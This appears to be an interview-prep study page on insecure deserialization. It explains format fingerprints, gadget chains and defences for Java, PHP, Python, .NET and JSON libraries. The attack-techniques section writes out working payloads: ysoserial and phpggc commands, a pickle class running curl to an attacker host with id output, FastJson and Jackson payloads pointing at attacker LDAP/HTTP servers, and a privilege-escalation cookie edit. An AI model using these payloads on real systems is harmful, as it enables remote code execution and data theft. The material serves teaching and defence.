# Insecure Deserialization

> Serialization flattens a live object (its class identity, fields, and private state) into a byte stream; deserialization rebuilds that object. Native deserializers were designed to faithfully reconstruct arbitrary types, so they instantiate whatever class the bytes name and run that class's reconstruction callbacks (`readObject`, `__wakeup`, `__destruct`, `__reduce__`) before the application ever inspects the result. The root cause is not a specific gadget: it is that the deserializer treats the byte stream as trusted, letting an attacker choose which classes get built and which lifecycle code runs. As PortSwigger puts it, many deserialization attacks complete before deserialization finishes, which is why even strongly typed languages are exploitable. The correct mental frame: user-controlled bytes = attacker-controlled control flow across the entire classpath.

**Interview frequency:** Common

## How it works

Serialization has to persist type, not just data. That is the whole problem. A JSON object `{"admin":true}` is data; a Java serialized `User` carries the string `User`, the field layout, and instructions that cause the JVM to allocate and populate a real `User` instance. To support graphs, cyclic references, and custom persistence, the native formats invoke per-class hooks during reconstruction. Those hooks are ordinary application/library code running with attacker-supplied field values.

Recognizing the format is the first skill. Each language leaves a fingerprint.

```
# Java (java.io.ObjectOutputStream): magic 0xACED, version 0x0005
hex:    ac ed 00 05 73 72 ...          # "sr" = TC_OBJECT, TC_CLASSDESC
base64: rO0AB...                        # rO0 is the giveaway
http:   Content-Type: application/x-java-serialized-object

# PHP (serialize()): human-readable, type letter + length
O:4:"User":2:{s:8:"username";s:6:"carlos";s:7:"isAdmin";b:0;}
# O = object, s = string, i = int, b = bool, a = array, N = null

# Python pickle: opcode stream; protocol 0 is ASCII and ends with "." (STOP)
# base64 of protocol 4/5 payloads commonly starts with gASV / gAWV

# .NET BinaryFormatter / LosFormatter / ObjectStateFormatter
base64: AAEAAAD/////...                 # 00 01 00 00 00 FF FF FF FF header
# ASP.NET Web Forms __VIEWSTATE is base64 and often starts /wEP...
```

Where the bytes live matters as much as their shape: cookies and hidden fields (`__VIEWSTATE`, session blobs), custom headers and `Authorization`, message-queue bodies (JMS, AMQP, RabbitMQ), caches (Redis/Memcached storing serialized objects), RMI/JMX endpoints, and any `remember-me` token. Burp Scanner (Pro) flags HTTP messages that look like serialized objects.

The lifecycle hooks are the ignition. In Java, a `Serializable` class may declare a private `readObject(ObjectInputStream)`; `ObjectInputStream.readObject()` calls it as an implicit constructor during deserialization. In PHP, `unserialize()` triggers `__wakeup()` on rebuild and `__destruct()` when the object is later garbage-collected. In Python, `pickle` executes whatever the object's `__reduce__` returns as a `(callable, args)` pair. .NET runs `[OnDeserializing]`/`[OnDeserialized]` callbacks and `ISerializable` constructors. Ruby `Marshal.load` rebuilds arbitrary objects and can trigger methods during coercion.

```mermaid
flowchart TD
  A[Attacker crafts serialized payload, gadget chain] --> B[Endpoint deserializes untrusted bytes]
  B --> C[Deserializer instantiates the class named in the stream]
  C --> D[Lifecycle hook fires automatically: readObject, __wakeup, or __reduce__]
  D --> E[Hook chains through existing classpath methods, the gadget chain]
  E --> F[Chain reaches a dangerous sink: reflection, exec, or file write]
  F --> G[Remote code execution]
```

```java
// This method, declared exactly like this, runs automatically on deserialize.
private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException {
    in.defaultReadObject();
    // any code here executes with attacker-controlled field values
}
```

## Quick reference

```
# PHP serialized session object; flip isAdmin from false (b:0) to true (b:1)
O:4:"User":2:{s:8:"username";s:6:"carlos";s:7:"isAdmin";b:1;}
# Re-encode and replay: if the app trusts the deserialized object's isAdmin field
# with no integrity check, one flipped byte is privilege escalation.
```

| Invariant | Where enforced | How violated | Source |
|---|---|---|---|
| No post-construction check can undo a deserialization attack, because lifecycle hooks fire during reconstruction, before application code runs | Pre-deserialization integrity gate (HMAC/signature check before the `deserialize()` call) | `readObject`/`__wakeup`/`__reduce__` execute before any `instanceof` or business-logic check, so checking type after the fact is already too late | <sup>[[7]](#ref7)</sup> |
| Every class reachable via the classpath/dependency tree is deserialization attack surface, not just classes the app calls directly | Dependency hygiene / gadget-surface reduction | ysoserial's `CommonsCollections1` chain reaches RCE purely because Commons-Collections sits on the classpath, not because the app ever calls it | <sup>[[2]](#ref2)</sup> |
| A native deserializer instantiates only an explicitly allowlisted set of classes, never whatever class name the byte stream carries | `ObjectInputFilter` (JEP 290) / `resolveClass()` override / `SerializationBinder` allowlist | An unfiltered `ObjectInputStream.readObject()` builds any class named in the stream, letting a gadget chain run unchecked | <sup>[[8]](#ref8)</sup> |
| Polymorphic JSON/XML type resolution is off by default; the document never selects its own deserialization target class | Jackson default-typing / `@JsonTypeInfo`, FastJson `safeMode`, Json.NET `TypeNameHandling` config | `TypeNameHandling != None` lets a `$type` field instantiate `ObjectDataProvider`, turning a "safe" JSON endpoint into RCE | <sup>[[5]](#ref5)</sup> |
| Deserialization of client-held state is gated on a MAC/signature validated with a secret the deserializer never trusts implicitly | `ObjectStateFormatter` MAC check against `machineKey`, before ViewState is deserialized | A leaked or default `machineKey` lets an attacker forge a MAC-valid ViewState blob that deserializes straight into an RCE gadget chain | <sup>[[6]](#ref6)</sup> |
| Blind deserialization is confirmed with a universal, library-independent payload before hunting for a gadget-specific chain | Pre-exploitation methodology (`URLDNS` DNS callback / `JRMPClient` TCP connect) | Jumping straight to a gadget-specific chain wastes effort when the classpath doesn't match; a DNS/TCP callback proves untrusted deserialization is happening at all | <sup>[[2]](#ref2)</sup> |

## Attack techniques

### 1. Attribute tampering and object injection (the entry step)

Flip a value or inject an unexpected class. The classic PHP example: a session cookie holding `O:4:"User":2:{s:8:"username";s:6:"carlos";s:7:"isAdmin";b:0;}`. Change `b:0` to `b:1`, re-encode, and if the app does `if ($user->isAdmin === true)` against the deserialized object with no integrity check, that is privilege escalation. When editing, you must fix the length prefixes and type tags or the blob corrupts and will not deserialize.

### 2. PHP loose-comparison type juggling

Because deserialization preserves type, you can supply an integer where a string is expected and abuse `==`.

```php
$login = unserialize($_COOKIE['data']);
if ($login['password'] == $password) { /* authenticated */ }
```

Set `password` to the integer `0`. On PHP 7.x, `0 == "any non-numeric string"` is `true`, so the check passes without knowing the real password. WHY: PHP 7 coerces the string to `0` for the comparison; you can only do this because the serialized blob carried the integer type. Note (senior detail): PHP 8 changed this, so `0 == "Example"` is now `false` and this specific bypass is dead there, but `5 == "5 of x"` still holds in PHP 8.

### 3. Abusing existing application functionality

If a magic method or later code does something dangerous with a field, point the field at your target. Example from PortSwigger<sup>[[1]](#ref1)</sup>: a delete-account flow removes `$user->image_location`; inject that field set to `/var/www/config.php` (or any path) and account deletion becomes arbitrary file delete.

### 4. Gadget chains and POP (Property-Oriented Programming)

The high-severity technique. You do not write new code; you supply data that flows through methods that already exist in the app or its libraries. A chain has a kick-off gadget (a magic method invoked on deserialize), link gadgets (each calls the next based on field values), and a sink gadget (does the dangerous thing: reflection, process exec, file write, secondary deserialization). In PHP the chain is built purely from properties whose values steer `__destruct`/`__wakeup`/`__toString` into a sink, hence "property-oriented programming."

### 5. Pre-built Java chains with ysoserial (Chris Frohoff / Gabriel Lawrence, "Marshalling Pickles," AppSecCali 2015)

ysoserial ships chains keyed to library versions on the classpath.<sup>[[2]](#ref2)</sup>

```
# Commons-Collections RCE: InvokerTransformer reflectively calls Runtime.exec
java -jar ysoserial.jar CommonsCollections1 'curl http://oob.attacker/$(id|base64)' | base64

# Java 16+ needs module opens (per PortSwigger):
java --add-opens=java.base/java.util=ALL-UNNAMED \
     --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED \
     -jar ysoserial.jar CommonsCollections6 'nslookup oob.attacker'
```

The canonical link chain is `AnnotationInvocationHandler` -> `LazyMap.get` -> a `ChainedTransformer` of `ConstantTransformer` + `InvokerTransformer` that ends in `Runtime.getRuntime().exec()` (Java 16+ needing `--add-opens` module flags is a PortSwigger-documented wrinkle<sup>[[1]](#ref1)</sup>). This was the basis of the November 2015 FoxGlove Security disclosure (Stephen Breen, "What Do WebLogic, WebSphere, JBoss, Jenkins, OpenNMS, and Your Application Have in Common?")<sup>[[3]](#ref3)</sup> that broke WebLogic (CVE-2015-4852), Jenkins (CVE-2015-8103), and others. The vulnerable artifact was Apache Commons-Collections sitting on the classpath, not code the app authors wrote.

### 6. Detection/universal chains (no vulnerable library required)

Two ysoserial payloads confirm blind deserialization on any modern JVM<sup>[[2]](#ref2)</sup>:

```
java -jar ysoserial.jar URLDNS   http://<id>.oob.attacker/   | base64   # forces a DNS lookup
java -jar ysoserial.jar JRMPClient 10.0.0.5                    | base64   # forces a TCP connect
```

`URLDNS` triggers a DNS resolution of your Collaborator domain and does not depend on any specific gadget library, so a callback proves the byte stream was deserialized. `JRMPClient` opens a TCP connection to a raw IP: send one payload pointing at a local address and one at a firewalled external address; if the local one returns fast and the external one hangs, the timing differential confirms deserialization even when DNS is blocked. This is the confirm-before-RCE workflow.

### 7. PHP chains with phpggc (PHP Generic Gadget Chains, ambionics)

Equivalent to ysoserial for frameworks like Laravel, Symfony, Monolog, WordPress, Drupal.<sup>[[4]](#ref4)</sup>

```
phpggc Monolog/RCE1 system 'id'                 # emit a POP chain payload
phpggc -p phar Monolog/RCE1 system id -o evil.phar   # wrap it in a PHAR for the trick below
```

### 8. PHAR deserialization (no visible `unserialize()`)

Sam Thomas's technique (BlackHat USA 2018, featured in PortSwigger's Top 10 Web Hacking Techniques of 2018). PHAR archive manifests store serialized metadata that PHP deserializes implicitly whenever a filesystem function operates on a `phar://` stream, including "safe-looking" ones like `file_exists()`, `is_dir()`, `filesize()`, `getimagesize()`. Upload a polyglot that is a valid JPEG and a valid PHAR (extension is not checked when reading a stream), then coerce the app into `file_exists("phar://uploads/avatar.jpg")`. `__wakeup`/`__destruct` fire and the POP chain runs.

### 9. JSON/XML as a deserialization sink via polymorphic typing

"Safe" formats become RCE when the library lets the document choose the class (Alvaro Munoz and Oleksandr Mirosh, "Friday the 13th: Attacking JSON," 2017).

```json
// Jackson with default typing / @JsonTypeInfo enabled: [type, value] tuples
["org.springframework.context.support.ClassPathXmlApplicationContext",
 "http://attacker/spel.xml"]

// FastJson autotype (<= 1.2.68 by default): @type instantiates arbitrary classes
{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker/x","autoCommit":true}

// Json.NET / .NET with TypeNameHandling != None: $type controls the class
{"$type":"System.Windows.Data.ObjectDataProvider, PresentationFramework", ...}
```

FastJson autotype reached RCE via `JdbcRowSetImpl` performing a JNDI lookup to an attacker LDAP server (CVE-2017-18349). jackson-databind polymorphic deserialization produced a long CVE series (for example CVE-2017-7525) as new "deserialization gadget" classes with JNDI/JdbcRowSet-style sinks were found. Moritz Bechler's marshalsec paper and tool ("Java Unmarshaller Security") systematized these across Jackson, FastJson, and others.<sup>[[5]](#ref5)</sup> SnakeYAML's default constructor deserializes arbitrary types from `!!javax...`/`!!com...` tags (CVE-2022-1471); its `SafeConstructor` disables it.

### 10. Python and Ruby (deserialization is code by design)

Pickle needs no gadget hunting; `__reduce__` returns a callable and args that pickle will invoke.

```python
import pickle, os, base64
class RCE:
    def __reduce__(self):
        return (os.system, ("curl http://oob.attacker/$(id)",))
payload = base64.b64encode(pickle.dumps(RCE()))   # any pickle.loads() on this = RCE
```

`yaml.load(untrusted)` (unsafe loader) is equivalent: `!!python/object/apply:os.system ["id"]`. In Ruby, `Marshal.load` on attacker bytes is exploitable; Luke Jahnke (elttam) published a universal RCE gadget chain for stock Ruby that needs no third-party gems. Node's `node-serialize` executes an IIFE-tagged function on `unserialize()` via the `_$$ND_FUNC$$_` marker (CVE-2017-5941).

### 11. .NET formatters and ViewState

`BinaryFormatter`, `LosFormatter`, `ObjectStateFormatter`, `NetDataContractSerializer`, and `SoapFormatter` embed .NET type names; ysoserial.net produces chains (TypeConfuseDelegate, ObjectDataProvider, etc.).<sup>[[6]](#ref6)</sup> ASP.NET `__VIEWSTATE` is `ObjectStateFormatter` output; if MAC validation is disabled or the `machineKey` (validationKey/decryptionKey) leaks or is a known default, an attacker forges a ViewState that deserializes to RCE. Microsoft Exchange shipped a static `machineKey`, making CVE-2020-0688 a mass-exploited ViewState RCE. Telerik UI's `RadAsyncUpload` deserialized attacker data (CVE-2019-18935). Microsoft's guidance: `BinaryFormatter` is dangerous and cannot be secured.

Blind/OOB across all of the above: when no output returns, use DNS/HTTP callbacks (URLDNS, phpggc with an OOB command, pickle calling `curl`), timing (JRMPClient), or second-order triggers (blob is stored and deserialized later by a worker). Confirmation is a network interaction or a measurable delay, not a returned response body.

## Defense

### Real fix

1. Do not deserialize untrusted data with a native or polymorphic deserializer. PortSwigger<sup>[[7]](#ref7)</sup> and OWASP<sup>[[8]](#ref8)</sup> both state it is effectively impossible to securely deserialize untrusted input with these mechanisms because you cannot enumerate every gadget across transitive dependencies. If users do not hand you serialized objects, the class of bug disappears.

2. Use a pure data format with type resolution disabled. Move to JSON/XML mapped to explicit DTOs, and turn off any feature that lets the document pick the class:
   - Jackson: never call `enableDefaultTyping()`; avoid `@JsonTypeInfo` on untrusted input; if polymorphism is required, use `activateDefaultTyping` with a strict `PolymorphicTypeValidator` allowlist. Jackson is safe by default as long as polymorphic typing is off.
   - FastJson: enable `safeMode` (disables autotype entirely); prefer fastjson2 with autotype off.
   - Json.NET: keep `TypeNameHandling = TypeNameHandling.None`; if you must round-trip types, add a custom `SerializationBinder` allowlist. Do not pair `JavaScriptSerializer` with a `JavaScriptTypeResolver`.
   - Python: `yaml.safe_load`, never `pickle`/`jsonpickle` on untrusted data.
   - .NET: `DataContractSerializer`/`XmlSerializer` with a fixed, known type, never a type chosen from the data; avoid `XMLDecoder` in Java and `XMLDecoder`-equivalents.
   - SnakeYAML `SafeConstructor`; Kryo with class registration on; XStream >= 1.4.17 with allowlist intact.

### Defense in depth

1. Integrity-protect any serialized state you must send through the client. Sign with HMAC (or authenticated encryption) and verify before deserializing, so tampered blobs are rejected up front. This is exactly why ASP.NET ViewState requires MAC/`machineKey` protection. Critical ordering point: the check must happen before deserialization, because gadget chains fire during the process. Encoding or plain base64 is not integrity; encryption without a MAC can still be malleable.

2. If native deserialization is unavoidable, allowlist classes with a look-ahead filter.
   - Java: `ObjectInputFilter` (JEP 290, built into the JVM) configured with a strict allowlist and depth/size limits; or subclass `ObjectInputStream` and override `resolveClass()` to permit only expected types (OWASP's `LookAheadObjectInputStream` pattern).<sup>[[8]](#ref8)</sup> Libraries: SerialKiller, Apache Commons IO `ValidatingObjectInputStream`, NotSoSerial. For code you cannot change, apply a JVM agent (Contrast rO0) to harden every `ObjectInputStream`.
   - .NET: a custom `SerializationBinder` that returns only expected types (still risky, since some allowed native types carry dangerous properties).
   - Prefer allowlists to denylists; denylists lose to the next gadget class.

3. Reduce gadget surface and patch. Keep dependencies minimal and current; remove old Commons-Collections, vulnerable jackson-databind, pre-safemode FastJson, SnakeYAML, etc. Presence on the classpath is the attack surface even if your code never calls the class. Tools: Serianalyzer (static bytecode analysis), gadget scanners, and the Java Deserialization Scanner Burp extension.

4. Harden data model and runtime. Mark sensitive fields `transient` (Java) so they are never serialized/clobbered; declare a `final readObject()` that throws on domain objects that must never be deserialized. Run deserializing components with least privilege and constrained network egress so a successful chain cannot reach JNDI/LDAP/metadata or exfiltrate.

Reference: OWASP Deserialization Cheat Sheet<sup>[[8]](#ref8)</sup>, OWASP ASVS V5 (Validation, Sanitization and Encoding) requirements on deserializing untrusted data, and the language-specific Java/DotNet Security Cheat Sheets.

## Interviewer probes

**The payloads use JSON, not a native binary format, so this app isn't exposed to deserialization attacks, right?**

Mid: Not automatically. If the deserializer supports polymorphic type resolution, such as Jackson's default typing, the payload can still specify which class to instantiate and get code execution.

Principal: Not necessarily. JSON and XML are only safe when type handling is off. Jackson's default typing, FastJson's autotype, and Json.NET's `TypeNameHandling` all let the document itself choose which class gets instantiated, which turns a "safe" format into a full RCE sink the same way a native deserializer is. The question isn't the wire format, it's whether a config flag lets the attacker pick the class.

**You found the app uses an old, vulnerable version of Commons-Collections. You upgraded it and confirmed the ysoserial payload no longer works. Is this fixed?**

Mid: No. That closes one known exploit path, but the app is still deserializing untrusted input directly, so another gadget chain in a different library could still get you RCE.

Principal: The library upgrade closed one gadget chain, not the vulnerability. The actual bug is that the endpoint deserializes untrusted input with a native deserializer at all; transitive dependencies and future-discovered gadget classes, plus the fact that memory-corruption bugs can exist in the deserializer itself, mean you cannot enumerate every dangerous class on the classpath. Removing one gadget is whack-a-mole. The fix is to stop deserializing untrusted bytes with that mechanism, or gate it with an integrity check before deserialization ever runs.

**Couldn't you just check the object's type after deserializing, and reject anything unexpected?**

Mid: Not reliably. By the time you can inspect the object's type, it has already been constructed, and any malicious code in its deserialization callbacks, like `readObject` or `__wakeup`, has already run.

Principal: That check runs too late. By the time `if (obj instanceof DangerousType)` executes, the object has already been constructed and its lifecycle hooks, `readObject`, `__wakeup`, `__reduce__`, whatever the language calls them, have already run. The gadget chain fires during reconstruction, before your application code ever sees the result. The check has to precede deserialization entirely, which in practice means a signature/HMAC gate or not deserializing untrusted bytes at all.

**This is a strongly-typed Java codebase with strict interfaces everywhere. Does that reduce the deserialization risk?**

Mid: Not really. Static typing only governs what your code does with the object after it's built, but the dangerous code runs during construction, before any type check ever executes.

Principal: Not for this bug class. The attacker's injected object might end up being the "wrong" type and throw an exception later in the business logic, but that's irrelevant, because the kick-off gadget already executed during `readObject`, before any type check in your code could run. Static typing constrains what your code does with the object after construction; it says nothing about what runs during construction.

**If there's no known vulnerable gadget-chain library on the classpath, how would you even confirm the app is deserializing untrusted bytes?**

Mid: Send a payload that triggers an out-of-band callback, like a DNS lookup to a domain you control, and see whether it fires: that confirms deserialization is happening independent of any specific gadget.

Principal: Use a universal payload that doesn't depend on any specific gadget library. ysoserial's `URLDNS` payload forces a DNS lookup to a domain you control purely from classes present in any JVM, so a callback proves the bytes were deserialized regardless of what's on the classpath. `JRMPClient` does the same with a raw TCP connect, useful when DNS egress is blocked, and the timing differential between a local and a firewalled target confirms it even blind. This is the confirm-before-you-hunt-for-RCE workflow.

**The endpoint calls `file_exists()` on an uploaded file's path, there's no `unserialize()` anywhere in the code. Any deserialization risk there?**

Mid: Possibly. In PHP, filesystem functions operating on a `phar://` stream can trigger deserialization implicitly, even with no explicit `unserialize()` call in the code.

Principal: Yes, and it's the subtle PHP case interviewers use to test for implicit sinks. A PHAR archive's manifest stores serialized metadata that PHP deserializes automatically whenever a filesystem function operates on a `phar://` stream, including read-only, "safe-looking" calls like `file_exists()`, `is_dir()`, or `getimagesize()`. Upload a polyglot that's a valid image and a valid PHAR, then get the app to touch it through a `phar://` wrapper, and `__wakeup`/`__destruct` fire without any explicit deserialization call in sight.

## Sources

<a id="ref1"></a>[1] PortSwigger Web Security Academy, "Exploiting insecure deserialization vulnerabilities". Retrieved 2026. https://portswigger.net/web-security/deserialization/exploiting

<a id="ref2"></a>[2] ysoserial (Chris Frohoff), Java gadget-chain payload generator. GitHub. Retrieved 2026. https://github.com/frohoff/ysoserial

<a id="ref3"></a>[3] Stephen Breen (FoxGlove Security), "What Do WebLogic, WebSphere, JBoss, Jenkins, OpenNMS, and Your Application Have in Common? This Vulnerability." 2015-11-06. http://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/

<a id="ref4"></a>[4] phpggc (ambionics), PHP Generic Gadget Chains. GitHub. Retrieved 2026. https://github.com/ambionics/phpggc

<a id="ref5"></a>[5] Moritz Bechler, marshalsec, "Java Unmarshaller Security". GitHub. Retrieved 2026. https://github.com/mbechler/marshalsec

<a id="ref6"></a>[6] ysoserial.net, .NET deserialization payload generator. GitHub. Retrieved 2026. https://github.com/pwntester/ysoserial.net

<a id="ref7"></a>[7] PortSwigger Web Security Academy, "Insecure deserialization". Retrieved 2026. https://portswigger.net/web-security/deserialization

<a id="ref8"></a>[8] OWASP, "Deserialization Cheat Sheet". Retrieved 2026. https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html
